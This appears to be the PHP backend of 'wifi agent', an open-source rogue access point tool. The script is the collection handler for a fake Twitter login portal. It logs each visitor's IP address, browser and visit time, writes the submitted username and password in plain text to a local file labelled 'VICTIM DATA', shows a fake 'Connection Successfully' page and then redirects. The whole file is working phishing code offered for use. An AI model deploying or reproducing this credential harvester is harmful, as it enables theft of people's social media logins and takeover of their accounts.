<?php 

/*
*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
*  wifi agent is a rogue access point.
*
*  wifi agent is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  wifi agent is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


// Set File write informations
$file = "data.txt";


// Get Full date of victim visit
$full_date = date("d-m-Y h:i:s");


// Get Victim IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}


// Get Victim Browser
$browser = $_SERVER['HTTP_USER_AGENT'];



file_put_contents($file, print_r("\nTWITTER VICTIM DATA => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("Portal: TWITTER \n", true), FILE_APPEND);
file_put_contents($file, print_r("IP: $ip \n", true), FILE_APPEND);
file_put_contents($file, print_r("Full-Date: $full_date \n", true), FILE_APPEND);
file_put_contents($file, print_r("User-Agent: $browser \n", true), FILE_APPEND);
file_put_contents($file, "Username: " . $_POST['phone_or_email'] . "\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['password'] . "\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);


	 echo "<html>
         <body style='background-color:#f6f6f6;'>
        <div align='center'> <br>
       <font size='7' color='blue'> Connection Successfully </font> 
       <hr>
	 <img align='center' src='free-wifi-logo.jpeg' height='40%' width='90%'> <br><br>
	  <img align='center' src='back.jpeg' height='40%' width='100%'> 
	</div>
	</body>
	 </html>"; 
	
  
//redirect
echo "<meta http-equiv='refresh' content='2; url=http://en.google.co/google.php'>";

?>
